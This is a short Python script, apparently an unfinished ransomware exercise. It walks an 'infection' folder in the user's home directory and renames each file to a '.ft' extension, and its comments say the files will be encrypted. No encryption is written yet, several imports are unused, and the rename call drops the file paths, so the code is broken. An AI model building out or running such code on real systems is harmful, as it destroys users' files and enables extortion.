from genericpath import isfile
from getpass import getuser
from importlib.metadata import files
import os
from xml.etree.ElementTree import ElementTree

user = getuser()
user_dir = '/home/'+user+'/infection'
# Files that will be encrypted
scanned_files = []
# Directories that will be encrypted
scanned_dir = []
# Files errors


def scan():
    for path, currentDirectory, files in os.walk('/home/'+user+'/infection'):
        for dir in currentDirectory:
            scanned_dir.append(dir)
        for file in files:
            scanned_files.append(file)
        
scan()
print(scanned_files)
print(scanned_dir)

for element in scanned_files:
    base = os.path.splitext(element)[0]
    os.rename(element, base + '.ft')
    
print(scanned_files)
